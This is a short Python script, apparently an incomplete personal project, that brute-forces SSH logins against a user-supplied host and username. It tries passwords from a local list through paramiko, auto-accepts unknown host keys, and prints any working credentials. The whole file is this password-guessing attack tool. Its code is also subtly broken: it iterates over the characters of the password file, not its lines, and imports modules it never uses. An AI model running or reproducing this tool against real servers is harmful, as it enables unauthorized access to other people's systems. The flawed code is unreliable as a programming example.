# ssh libraries 
# os.system('standard way to connect to ssh')
# python-nmap
# paramiko
from socket import socket
from time import sleep

import paramiko
import pwnedpasswords


def start():
    # TODO clear the screen and print an ssh banner 
    host = input("What is the Host? ")
    username = input("What is the Username? ")
    print(host)
    f = open('./passlist', 'r')
    passwords = f.read()
    # 5 mins 
    # python get file text by line
    for password in passwords:
      connected = attempt_to_login(host, username, password)
      if connected:
        sleep(5)
        return

def attempt_to_login(host: str, username: str, password: str):
  try:
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    print(f'[-] --- Attempting to login with {host}, {username}, {password}')
    ssh.connect(host, username=username, password=password, timeout=1.5)
    ssh.close()
    print(f'[!] SUCCESSFULLY CONNECTED WITH {username}@{host} :password {password}')
    return True
  except paramiko.AuthenticationException:
    print('Invalid Credentials bad username or password')
  except:
    print("SOMETHING WENT WRONG")
  return False
